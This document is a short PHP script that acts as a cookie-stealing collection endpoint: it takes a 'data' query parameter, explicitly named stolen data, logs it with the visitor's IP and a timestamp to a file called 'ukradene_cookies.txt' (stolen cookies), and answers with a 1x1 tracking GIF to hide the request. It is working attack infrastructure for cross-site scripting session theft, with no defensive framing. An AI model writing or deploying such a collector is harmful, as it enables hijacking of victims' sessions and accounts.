<?php
header('Content-Type: text/plain');
if (!empty($_GET['data'])) {

    $stolen_data = $_GET['data'];

    $log_entry = date('Y-m-d H:i:s') . ' - IP: ' . $_SERVER['REMOTE_ADDR'] . "\n" . 'Data: ' . $stolen_data . "\n\n";

    file_put_contents('ukradene_cookies.txt', $log_entry, FILE_APPEND);
}

header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
exit();
?>